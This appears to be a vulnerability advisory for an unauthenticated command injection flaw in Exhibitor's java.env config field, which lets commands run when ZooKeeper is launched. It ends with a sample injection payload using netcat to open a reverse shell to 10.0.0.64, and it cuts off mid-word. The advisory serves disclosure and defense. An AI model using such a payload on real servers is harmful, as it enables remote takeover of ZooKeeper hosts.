Arbitrary shell commands surrounded by backticks or $  (  ) can be inserted into the editor and will be executed by the Exhibitor process when it launches ZooKeeper. An attacker can execute any command as the user running the Exhibitor process. ， Tested Versions ， Tested version was compiled using the standalone pom.xml from the Exhibitor master branch. ，  ( Note that the latest released version is labeled 1.7.1 , but the version in the exhibitor-standalones pom.xml is set to 1.6.0. )  ， The vulnerability should affect all versions at least as far back as 1.0.9 , when the javaEnvironment variable was added. ， Product URLs ， CVSSv3 Score ， 9.8 - CVSS : 3.0/AV : N/AC : L/PR : N/UI : N/S : U/C : H/I : H/A : H ， CWE ， CWE-78 - Improper Neutralization of Special Elements used in an OS Command ， Details ， Exhibitor is a ZooKeeper supervisory process , which is described in the ZooKeeper documentation. ， Since the ZooKeeper server will exit on an error , the Apache ZooKeeper documentation suggests a supervisory process that manages the ZooKeeper server process , mainly for the purpose of restarting ZooKeeper when it exits. ， Exhibitors Web UI does not have any form of authentication , and prior to version 1.7.0 , did not have any way to specify which interfaces to listen on. Exposing Exhibitor is dangerous for the ZooKeeper ensemble because Exhibitor allows the changing of the ZooKeeper configuration , and also provides a UI for viewing and modifying keys and values stored in ZooKeeper. ， By default , the Exhibitor Web UI listens on TCP 8080. However , since this port is commonly used , it may be common to find it on other ports as well. ， Under the Config tab in the Exhibitor Web UI , the java.env script field can be modified and the new configuration pushed to ZooKeeper. Exhibitor launches ZooKeeper through a script , and the contents of this field are passed , unmodified , as arguments to the Java command to launch ZooKeeper , which can be seen here. ，  ( The contents of the java.env script field are passed in as $ JVMFLAGS. )  ， Based on how this argument is passed , there are several ways to execute arbitrary commands. The methods tested were surrounding the command with backticks and using $  (  )  , for example :  ，  $  ( /bin/nc -e /bin/sh 10.0.0.64 4444 & )  ， This example uses net",
